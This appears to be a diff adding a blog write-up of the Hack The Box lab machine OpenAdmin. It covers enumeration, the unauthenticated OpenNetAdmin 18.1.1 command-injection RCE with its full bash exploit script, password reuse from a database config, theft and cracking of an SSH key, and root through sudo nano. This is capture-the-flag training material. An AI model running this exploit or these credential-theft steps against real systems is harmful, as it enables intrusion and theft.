@@ -1,0 +1,213 @@
+I"�2<p><strong><center>Ref°: HTB-05-Machine</center></strong></p>
+
+<p>— Openadmin is a Linux machine that highlights the exploitation of RCE through OpenNetAdmin version 18.1.1 to gain a foothold. Lateral movement with enumeration to find clear password in opennetadmin database. Again Lateral movement on 2nd user through vhost wich execute in local the read of her private ssh key. After crack it with john, we get Flag user.</p>
+
+<p>Sudo misconfiguration is present for the second user Joanna. Wich allow the execution of nano command under root permission without password. That to get Flag root.</p>
+
+<p><img src="/assets/images/openadmin/HTB-Information-Openadmin.png" alt="Desktop View" /></p>
+
+<h2 id="1-discovery---figure-out-environment"><strong><span style="color:#c0392b">[1] Discovery - Figure out environment</span></strong></h2>
+<h3 id="check-all-services">Check all services</h3>
+<hr />
+
+<p>The nmap scan reveals <code class="language-plaintext highlighter-rouge">SSH</code> and <code class="language-plaintext highlighter-rouge">Apache</code> to be running on their usual ports.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">-A</span> <span class="nt">-T5</span> 10.10.10.171 <span class="nt">-p-</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/openadmin/HTB-Images-Openadmin-nmap.png" alt="Desktop View" /></p>
+
+<h3 id="web">Web</h3>
+<hr />
+
+<p>We discover folders named <code class="language-plaintext highlighter-rouge">artwork</code> and <code class="language-plaintext highlighter-rouge">music</code> under http://10.10.10.171</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>dirb http://10.10.10.171
+</code></pre></div></div>
+
+<p><img src="/assets/images/openadmin/HTB-Images-Openadmin-dirb.png" alt="Desktop View" /></p>
+
+<p><strong>Artwork site :</strong> Nothing interesting here.</p>
+
+<p><img src="/assets/images/openadmin/HTB-Images-Openadmin-artworksite.png" alt="Desktop View" /></p>
+
+<p><strong>Music site :</strong> We have redirection on other service through <code class="language-plaintext highlighter-rouge">login button</code>, wich is <code class="language-plaintext highlighter-rouge">OpenNetAdmin</code>.</p>
+
+<p><img src="/assets/images/openadmin/HTB-Images-Openadmin-musicsite.png" alt="Desktop View" /></p>
+
+<p>OpenNetAdmin provides a database managed inventory of your IP network. Each subnet, host, and IP can be tracked via a centralized AJAX enabled web interface that can help reduce tracking errors. We have version 18.1.1 of the software.</p>
+
+<p>Reference - OpenNetAdmin Software : <a href="https://opennetadmin.com/">https://opennetadmin.com/</a></p>
+
+<p><img src="/assets/images/openadmin/HTB-Images-Openadmin-opennetadmin.png" alt="Desktop View" /></p>
+
+<p>We have finish our first level of enumeration to find our target. Now we need to find any vulnerabilities to exploit it and gain a foothold.</p>
+
+<h3 id="vulnerabilities">Vulnerabilities</h3>
+<hr />
+
+<p>Here our target is OpenNetAdmin software. We check all vulnerabilities with searchsploit and we find 2 vulnerabilities presents in our version 18.1.1.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>searchsploit opennetadmin
+</code></pre></div></div>
+
+<p><img src="/assets/images/openadmin/HTB-Images-Openadmin-searchsploit.png" alt="Desktop View" /></p>
+
+<p>We use <code class="language-plaintext highlighter-rouge">Remote Code Execution</code> to gain our first level access on the target.</p>
+
+<h3 id="reviewing-code">Reviewing Code</h3>
+<p>Reference - exploit RCE : <a href="https://www.exploit-db.com/exploits/47691">https://www.exploit-db.com/exploits/47691</a></p>
+
+<p>AJAX arguments allow exploits a command injection in OpenNetAdmin.
+The vulnerability exists on the <code class="language-plaintext highlighter-rouge">tooltips.inc.php</code> component, due to the <code class="language-plaintext highlighter-rouge">insecure usage</code> of the <code class="language-plaintext highlighter-rouge">shell_exec()</code> PHP function.</p>
+
+<p>The execution of the RCE dont need to be authenticated or have an authenticated user.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/bin/bash
+URL="${1}"
+while true;do
+ echo -n "$ "; read cmd
+ curl --silent -d "xajax=window_submit&amp;xajaxr=1574117726710&amp;xajaxargs[]=tooltips&amp;xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&amp;xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
+done
+</code></pre></div></div>
+
+<h2 id="2foothold---get-into-the-target-"><strong><span style="color:#c0392b">[2] Foothold - Get into the target </span></strong></h2>
+<h3 id="obtaining-reverse-shell-from-rce-execution">Obtaining Reverse Shell from RCE Execution</h3>
+<hr />
+
+<p>Be careful, sometime script retrieve from searchsploit database dont work correctly. To remediate this, copy all code in new file.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>searchsploit <span class="nt">-m</span> 47691.sh
+<span class="gp">$</span><span class="w"> </span><span class="nb">sudo </span>bash 47691.sh http://10.10.10.171/ona/
+</code></pre></div></div>
+
+<p><img src="/assets/images/openadmin/HTB-Images-Openadmin-exploitrce.png" alt="Desktop View" /></p>
+
+<p>The exploitation is successful and we have gained a foothold.</p>
+
+<h2 id="3-lateral-movement---move-through-environment"><strong><span style="color:#c0392b">[3] Lateral Movement - Move through environment</span></strong></h2>
+<h3 id="plaintext-password-from-database">Plaintext Password from database</h3>
+<hr />
+
+<p>Enum with www-data account and check the file <code class="language-plaintext highlighter-rouge">/etc/passwd</code> to find all system users : <code class="language-plaintext highlighter-rouge">Jimmy and Joanna</code></p>
+
+<p><img src="/assets/images/openadmin/HTB-Images-Openadmin-passwd.png" alt="Desktop View" /></p>
+
+<p>After reading information on the installation of OpenNetAdmin : <a href="https://github.com/opennetadmin/ona/wiki/Install">https://github.com/opennetadmin/ona/wiki/Install</a></p>
+
+<p>We know that the admin or user password of the software is referenced in her database configuration file : <code class="language-plaintext highlighter-rouge">/var/www/ona/local/config/database_settings.inc.php</code></p>
+
+<p><img src="/assets/images/openadmin/HTB-Images-Openadmin-confdb.png" alt="Desktop View" /></p>
+
+<p>We find the database credentials <code class="language-plaintext highlighter-rouge">n1nj4W4rri0R!</code></p>
+
+<p>We can test ssh connection with this password and one of the both user finding below. This password is reused by the user system Jimmy.</p>
+
+<p><img src="/assets/images/openadmin/HTB-Images-Openadmin-sshjimmy.png" alt="Desktop View" /></p>
+
+<h3 id="reading-id_rsa">Reading id_rsa</h3>
+<hr />
+
+<p>We continue to enum www folder and we find interesting folder internal.
+This folder is manage only by our user. Let’s check in to find anything.</p>
+
+<p>We find 3 php files : <code class="language-plaintext highlighter-rouge">index.php</code>, <code class="language-plaintext highlighter-rouge">logout.php</code> and <code class="language-plaintext highlighter-rouge">main.php</code></p>
+
+<p><img src="/assets/images/openadmin/HTB-Images-Openadmin-internalfolder.png" alt="Desktop View" /></p>
+
+<p>We have the possibility to read the ssh private key of our 2nd user (Joanna) with the php function <code class="language-plaintext highlighter-rouge">shell_exec</code> through the page <code class="language-plaintext highlighter-rouge">main.php</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
+$output = shell_exec('cat /home/joanna/id_rsa');
+...
+</code></pre></div></div>
+
+<p>It makes sense to look vhost and see if we matching with our folder internal.
+We find vhost assign to Joanna on port <code class="language-plaintext highlighter-rouge">52846</code> below <code class="language-plaintext highlighter-rouge">/etc/apache2/sites-enabled/internal.conf</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>VirtualHost 127.0.0.1:52846
+...
+DocumentRoot /var/www/internal
+</code></pre></div></div>
+
+<p>So we have now everything we need to grab the private key of our 2nd system user.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>curl 127.0.0.1/52846/main.php
+</code></pre></div></div>
+
+<p><img src="/assets/images/openadmin/HTB-Images-Openadmin-privkeyssh.png" alt="Desktop View" /></p>
+
+<h3 id="cracking-password">Cracking Password</h3>
+<hr />
+
+<p>We retrieve the private key to exploit it with JohnTheRipper on our attacking machine.</p>
+
+<p>Reference - johntheripper tool : <a href="https://bytesoverbombs.io/cracking-everything-with-john-the-ripper-d434f0f6dc1c">https://bytesoverbombs.io/cracking-everything-with-john-the-ripper-d434f0f6dc1c</a></p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">sudo </span>python2 ssh2john.py sshprivkey_joanna <span class="o">&gt;</span> joanna.hash
+<span class="gp">$</span><span class="w"> </span><span class="nb">sudo </span>john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt joanna.hash
+</code></pre></div></div>
+
+<p><img src="/assets/images/openadmin/HTB-Images-Openadmin-jtrfind.png" alt="Desktop View" /></p>
+
+<p>We crack the password of the user Joanna : <code class="language-plaintext highlighter-rouge">bloodninjas</code></p>
+
+<p>Fix the warning on the unprotected ssh key file and connect on with ssh to grab the flag user.</p>
+
+<p>Reference - fix warning unprotected private key : <a href="https://www.howtogeek.com/168119/fixing-warning-unprotected-private-key-file-on-linux">https://www.howtogeek.com/168119/fixing-warning-unprotected-private-key-file-on-linux</a></p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">sudo chmod </span>600 sshprivkey_joanna
+</code></pre></div></div>
+
+<p><img src="/assets/images/openadmin/HTB-Images-Openadmin-sshjoanna.png" alt="Desktop View" /></p>
+
+<p>We flag the user to validate the compromission of the system users.</p>
+
+<p><img src="/assets/images/openadmin/HTB-Images-Openadmin-flaguser.png" alt="Desktop View" /></p>
+
+<h2 id="4-privilege-escalation---gain-higher-level-permissions"><strong><span style="color:#c0392b">[4] Privilege Escalation - Gain higher-level permissions</span></strong></h2>
+<h3 id="sudo-misconfiguration">Sudo Misconfiguration</h3>
+<hr />
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>
+</code></pre></div></div>
+
+<p>User Joanna may run the following commands with no password <code class="language-plaintext highlighter-rouge">(ALL) NOPASSWD: /bin/nano /opt/priv</code></p>
+
+<p><img src="/assets/images/openadmin/HTB-Images-Openadmin-sudopermission.png" alt="Desktop View" /></p>
+
+<p>We run this command to gain root access on the server :</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">sudo</span> /bin/nano /opt/priv
+</code></pre></div></div>
+<p>We have opening of one blank page under root permission. At this moment we can do everything.</p>
+
+<p><img src="/assets/images/openadmin/HTB-Images-Openadmin-blankpageroot.png" alt="Desktop View" /></p>
+
+<p>And we flag the root account to validate the compromission of the system.</p>
+
+<p>Go to read file with key combination <code class="language-plaintext highlighter-rouge">^R</code>.</p>
+
+<p><img src="/assets/images/openadmin/HTB-Images-Openadmin-Rtouch.png" alt="Desktop View" /></p>
+
+<p>Insert the file we want to read.</p>
+
+<p><img src="/assets/images/openadmin/HTB-Images-Openadmin-pathroot.png" alt="Desktop View" /></p>
+
+<h3 id="flag-root">Flag root</h3>
+<hr />
+
+<p>We grab our flag root value !</p>
+
+<p><img src="/assets/images/openadmin/HTB-Images-Openadmin-flagroot.png" alt="Desktop View" /></p>
+
+<hr />
+
+<h2 id="trophy"><strong><center>Trophy</center></strong></h2>
+
+<blockquote>
+  <p><strong>It’s never too late to start.</strong></p>
+
+  <p>Me, Myself and I</p>
+</blockquote>
+:ET
